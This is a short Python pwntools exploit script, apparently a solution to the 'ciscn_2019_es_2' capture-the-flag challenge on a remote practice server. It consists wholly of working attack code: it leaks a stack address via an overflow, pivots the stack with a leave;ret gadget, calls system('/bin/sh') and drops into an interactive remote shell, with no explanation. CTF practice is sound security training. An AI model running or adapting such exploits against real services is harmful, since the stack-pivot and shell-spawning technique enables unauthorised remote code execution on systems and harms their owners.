from pwn import *

context.log_level = 'debug'
# io = process('ciscn_2019_es_2')
io = remote('node4.buuoj.cn', 26613)
elf = ELF('ciscn_2019_es_2')
system_plt = elf.plt['system']
leave_ret = 0x080484b8

io.sendafter('Welcome, my friend. What\'s your name?\n', cyclic(0x28))
leak_stack = u32(io.recvn(0x33)[-4:])
buf = leak_stack - 0x38
payload = cyclic(4) + p32(system_plt) + cyclic(4) + p32(buf + 0x10) + b'/bin/sh\x00' + cyclic(0x10) + p32(buf) + p32(leave_ret)
io.send(payload)
io.interactive()

